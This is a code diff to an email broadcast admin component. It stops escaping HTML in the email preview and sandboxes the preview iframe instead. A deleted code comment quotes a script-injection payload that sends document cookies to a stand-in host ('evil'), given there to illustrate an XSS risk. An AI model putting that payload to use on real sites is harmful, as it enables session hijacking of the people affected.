@@ -36,14 +36,7 @@ import {
   StatBar,
 } from "@/components/admin/shared";
 
-/**
- * HTML-escape a string for safe interpolation into the broadcast email
- * template. Without this, a moderator could compose a `title` or
- * `content` containing `</h2><script>fetch('https://evil/?c='+document.cookie)</script>`
- * and the resulting email would run arbitrary JS in vulnradar.dev's
- * authenticated origin on any client that opens the preview pane or
- * forwards the message.
- */
+/** HTML-escape plain-text fields (the Subject line is not HTML). */
 function escapeHtml(input: string): string {
   return input
     .replace(/&/g, "&amp;")
@@ -77,9 +70,10 @@ const EMAIL_COLORS = {
 
 function generatePreviewHtml(title: string, content: string): string {
   const safeTitle = escapeHtml(title || "Subject");
-  const safeContent = escapeHtml(
-    content || "<p>Email content will appear here...</p>",
-  );
+  // Content is the "HTML supported" field (see the compose form label) and
+  // is sent to recipients unescaped, so the preview renders it the same
+  // way rather than showing literal escaped tag text.
+  const safeContent = content || "<p>Email content will appear here...</p>";
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -497,6 +491,7 @@ export function MassEmailManager() {
                 </DialogHeader>
                 <iframe
                   srcDoc={generatePreviewHtml(title, content)}
+                  sandbox=""
                   className="w-full h-[700px] border border-border/50 rounded-lg"
                   title="Email Preview"
                 />
